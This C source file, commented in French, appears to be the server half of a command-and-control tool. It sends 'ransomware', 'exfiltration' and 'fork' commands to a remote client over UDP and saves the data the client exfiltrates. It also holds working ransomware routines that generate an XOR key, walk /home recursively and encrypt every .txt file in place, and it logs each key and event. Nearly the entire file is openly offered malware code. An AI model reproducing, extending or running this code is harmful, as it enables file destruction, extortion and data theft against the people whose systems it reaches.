#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <time.h>
#include <ctype.h>
#include <dirent.h>
#include <sys/stat.h>
#include <sys/select.h>
#include <sys/wait.h>

// Définitions pour le port d'écoute et la taille maximale des buffers
#define PORT 4242
#define MAX_BUFFER_SIZE 1024
#define BUFFER_SIZE 1024

// Fonction pour enregistrer un événement dans un fichier log
void log_event(const char *client_id, const char *event_type, const char *details) {
    FILE *log_file = fopen("log.txt", "a");
    if (log_file == NULL) {
        perror("Error opening log file");
        return;
    }

    // Enregistre l'heure et la date actuelles
    time_t t;
    struct tm *tm_info;
    time(&t);
    tm_info = localtime(&t);

    char timestamp[26];
    strftime(timestamp, 26, "%Y-%m-%d %H:%M:%S", tm_info);

    // Ajoute un nouvel événement au fichier log
    fprintf(log_file, "=== Nouvel événement ===\n");
    fprintf(log_file, "Date/Heure: %s\n", timestamp);
    fprintf(log_file, "Client ID: %s\n", client_id);
    fprintf(log_file, "Type d'événement: %s\n", event_type);

    if (details != NULL && strlen(details) > 0) {
        fprintf(log_file, "Détails: %s\n", details);
    }

    fprintf(log_file, "\n");
    fclose(log_file);
}

// Fonction spécifique pour enregistrer des événements liés au ransomware
void log_ransomware_event(const char *client_id, const char *key, int is_encrypt, int files_processed) {
    char details[256];
    snprintf(details, sizeof(details), 
             "Action: %s\nClé utilisée: %s\nFichiers traités: %d", 
             is_encrypt ? "Chiffrement" : "Déchiffrement",
             key,
             files_processed);
    log_event(client_id, "RANSOMWARE", details);
}

// Génération aléatoire d'une clé de chiffrement (16 caractères)
void generate_encryption_key(char *key) {
    const char *chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    for (int i = 0; i < 16; i++) {
        key[i] = chars[rand() % strlen(chars)];
    }
    key[16] = '\0';
}

// Enregistre la clé de chiffrement dans un fichier
void save_key_to_file(const char *key) {
    FILE *key_file = fopen("key.dat", "w");
    if (key_file == NULL) {
        perror("Erreur lors de la création de key.dat");
        exit(EXIT_FAILURE);
    }
    fprintf(key_file, "%s", key);
    fclose(key_file);
}

// Charge la clé de chiffrement à partir d'un fichier
int load_key_from_file(char *key) {
    FILE *key_file = fopen("key.dat", "r");
    if (key_file == NULL) {
        return 0;
    }
    fgets(key, 17, key_file);
    fclose(key_file);
    return 1;
}

// Chiffre ou déchiffre un fichier en fonction de la clé donnée
void process_file(const char *filename, const char *key, int is_encrypting) {
    FILE *file = fopen(filename, "rb+");
    if (!file) {
        printf("Impossible d'ouvrir le fichier: %s\n", filename);
        return;
    }

    // Lecture du fichier en mémoire
    fseek(file, 0, SEEK_END);
    long filesize = ftell(file);
    fseek(file, 0, SEEK_SET);

    unsigned char *buffer = malloc(filesize);
    if (!buffer) {
        fclose(file);
        return;
    }

    size_t bytes_read = fread(buffer, 1, filesize, file);
    if (bytes_read <= 0) {
        free(buffer);
        fclose(file);
        return;
    }

    // Application de l'algorithme XOR pour le chiffrement/déchiffrement
    int key_len = strlen(key);
    for (long i = 0; i < filesize; i++) {
        buffer[i] = buffer[i] ^ key[i % key_len];
    }

    // Réécriture du fichier avec les données chiffrées/déchiffrées
    fseek(file, 0, SEEK_SET);
    fwrite(buffer, 1, filesize, file);

    free(buffer);
    fclose(file);

    printf("Fichier traité : %s\n", filename);
}

// Fonction récursive pour parcourir les répertoires et traiter les fichiers
void traverse_directories(const char *path, const char *key, int *file_count, int is_encrypting) {
    DIR *dir = opendir(path);
    if (!dir) return;

    struct dirent *entry;
    char full_path[1024];

    while ((entry = readdir(dir)) != NULL) {
        if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0)
            continue;

        snprintf(full_path, sizeof(full_path), "%s/%s", path, entry->d_name);

        struct stat path_stat;
        if (stat(full_path, &path_stat) != 0)
            continue;

        // Gestion des sous-répertoires
        if (S_ISDIR(path_stat.st_mode)) {
            // Exclusion des répertoires critiques
            if (strstr(full_path, "/proc") || strstr(full_path, "/sys") ||
                strstr(full_path, "/dev") || strstr(full_path, "/run"))
                continue;
            traverse_directories(full_path, key, file_count, is_encrypting);
        } else if (S_ISREG(path_stat.st_mode)) {
            // Vérifie si le fichier est un fichier texte (.txt)
            char *ext = strrchr(entry->d_name, '.');
            if (ext && strcasecmp(ext, ".txt") == 0) {
                process_file(full_path, key, is_encrypting);
                (*file_count)++;
            }
        }
    }

    closedir(dir);
}

// Fonction récursive pour parcourir les répertoires et traiter les fichiers
void process_all_files(const char *key, int *file_count, int is_encrypting) {
    *file_count = 0;
    printf("Début du traitement des fichiers...\n");
    traverse_directories("/home", key, file_count, is_encrypting);
    printf("Traitement terminé. %d fichiers traités.\n", *file_count);
}

// Réception et sauvegarde des données exfiltrées par le client
void receive_exfiltration(int sockfd, struct sockaddr_in *client_addr, socklen_t addr_len) {
    char buffer[BUFFER_SIZE];
    FILE *output_file = fopen("exfiltrated_data.txt", "w");
    struct timeval tv;
    fd_set readfds;

    if (output_file == NULL) {
        perror("Erreur lors de la création du fichier de sortie");
        return;
    }

    // Configuration du timeout
    tv.tv_sec = 5;
    tv.tv_usec = 0;

    while (1) {
        FD_ZERO(&readfds);
        FD_SET(sockfd, &readfds);

        int activity = select(sockfd + 1, &readfds, NULL, NULL, &tv);

        if (activity < 0) {
            perror("Erreur select");
            break;
        }

        // Vérification du timeout
        if (activity == 0) {
            printf("Timeout atteint - Fin de l'exfiltration\n");
            break;
        }

        // Réception des données
        memset(buffer, 0, BUFFER_SIZE);
        int bytes_received = recvfrom(sockfd, buffer, BUFFER_SIZE, 0,
                                    (struct sockaddr *)client_addr, &addr_len);

        if (bytes_received < 0) {
            perror("Erreur de réception");
            break;
        }

        // Fin de transmission détectée
        if (bytes_received >= 3 && strncmp(buffer, "EOF", 3) == 0) {
            printf("Fin de transmission détectée\n");
            break;
        }

        fwrite(buffer, 1, bytes_received, output_file);
    }

    fclose(output_file);
    printf("Données exfiltrées enregistrées dans exfiltrated_data.txt\n");
}

// Affiche un menu interactif pour l'utilisateur
void display_menu() {
    printf("\nCommandes disponibles:\n");
    printf("1. ransomware\n");
    printf("2. exfiltration\n");
    printf("3. fork\n");
    printf("4. out\n");
    printf("Choix: ");
}

// Fonction principale : initialise le serveur, traite les commandes, et gère les connexions
int main() {
    // Création et configuration de la socket
    int sockfd;
    struct sockaddr_in server_addr, client_addr;
    char buffer[MAX_BUFFER_SIZE];
    socklen_t addr_len = sizeof(client_addr);
    char client_id[50] = {0};
    int encrypted_files_count = 0;
    int decrypted_files_count = 0;

    if ((sockfd = socket(AF_INET, SOCK_DGRAM, 0)) < 0) {
        perror("Socket creation failed");
        exit(EXIT_FAILURE);
    }

    memset(&server_addr, 0, sizeof(server_addr));
    memset(&client_addr, 0, sizeof(client_addr));

    server_addr.sin_family = AF_INET;
    server_addr.sin_addr.s_addr = INADDR_ANY;
    server_addr.sin_port = htons(PORT);

    if (bind(sockfd, (const struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
        perror("Bind failed");
        exit(EXIT_FAILURE);
    }

    printf("Serveur UDP en écoute sur le port %d...\n", PORT);
    srand(time(NULL));

    while (1) {
        // Réinitialiser les variables pour une nouvelle connexion client
        memset(client_id, 0, sizeof(client_id));
        encrypted_files_count = 0;
        decrypted_files_count = 0;

        // Attente d'une connexion client
        int n = recvfrom(sockfd, client_id, sizeof(client_id), 0,
                         (struct sockaddr *)&client_addr, &addr_len);

        // Validation des données reçues
        if (n <= 0) {
            printf("Aucune donnée valide reçue. En attente de nouvelles connexions...\n");
            continue; // Ignorez cette itération et attendez de nouvelles connexions
        }

        client_id[n] = '\0';

        // Vérifiez si le `client_id` est valide
        if (strlen(client_id) == 0 || strcmp(client_id, "Action terminée") == 0) {
            printf("Données reçues invalides ou non interprétables. En attente de nouvelles connexions...\n");
            continue;
        }

        printf("\nClient connecté - ID: %s\n", client_id);
        log_event(client_id, "CONNEXION", "Nouvelle connexion établie");

        // Boucle pour gérer les commandes d'un client
        while (1) {
            display_menu();
            char command[50];
            fgets(command, sizeof(command), stdin);
            command[strcspn(command, "\n")] = 0;

            // Envoi de la commande au client
            sendto(sockfd, command, strlen(command), 0,
                   (const struct sockaddr *)&client_addr, addr_len);

            // Gestion des commandes
            if (strcmp(command, "ransomware") == 0) {
                printf("\nOptions ransomware:\n");
                printf("1. Chiffrer\n");
                printf("2. Déchiffrer\n");
                printf("Choix: ");

                int choice;
                scanf("%d", &choice);
                getchar(); // Nettoyage du buffer d'entrée

                char key[17];
                if (choice == 1) {
                    generate_encryption_key(key);
                    printf("Clé générée: %s\n", key);
                    save_key_to_file(key);
                    process_all_files(key, &encrypted_files_count, 1);
                    log_ransomware_event(client_id, key, 1, encrypted_files_count);
                    printf("Chiffrement terminé.\n");
                } else if (choice == 2) {
                    if (!load_key_from_file(key)) {
                        printf("Impossible de charger la clé.\n");
                        continue;
                    }
                    printf("Clé chargée: %s\n", key);

                    char input_key[17];
                    printf("Entrez la clé : ");
                    if (fgets(input_key, sizeof(input_key), stdin)) {
                        input_key[strcspn(input_key, "\n")] = 0;
                        if (strcmp(input_key, key) == 0) {
                            process_all_files(key, &decrypted_files_count, 0);
                            log_ransomware_event(client_id, key, 0, decrypted_files_count);
                            printf("Déchiffrement terminé.\n");
                        } else {
                            printf("Clé invalide.\n");
                            continue;
                        }
                    }
                } else {
                    printf("Option invalide.\n");
                    continue;
                }

                // Informer le client de la fin de la session
                sendto(sockfd, "disconnect", 10, 0,
                       (const struct sockaddr *)&client_addr, addr_len);
                printf("\nClient déconnecté après ransomware.\n");
                log_event(client_id, "DECONNEXION", "Session terminée par ransomware");
                break; // Déconnexion après ransomware
            } else if (strcmp(command, "exfiltration") == 0) {
                log_event(client_id, "COMMANDE", "Exfiltration demandée");
                printf("Commande d'exfiltration envoyée.\n");
                receive_exfiltration(sockfd, &client_addr, addr_len);
                printf("Exfiltration terminée.\n");
            } else if (strcmp(command, "fork") == 0) {
                log_event(client_id, "COMMANDE", "Fork demandé");
                printf("Commande fork envoyée.\n");
            } else if (strcmp(command, "out") == 0) {
                log_event(client_id, "DECONNEXION", "Session terminée par commande 'out'");
                printf("\nClient déconnecté après 'out'.\n");
                break; // Déconnexion après "out"
            } else if (strcmp(command, "disconnect") == 0) {
                log_event(client_id, "DECONNEXION", "Déconnexion demandée par le client");
                printf("\nDéconnexion demandée par le client.\n");
                break; // Terminer la session
            } else {
                printf("Commande invalide.\n");
            }
        }

        printf("En attente de nouvelles connexions...\n");
    }

    // Fermer la socket proprement (ne devrait pas être atteint dans ce cas)
    close(sockfd);
    return 0;
}
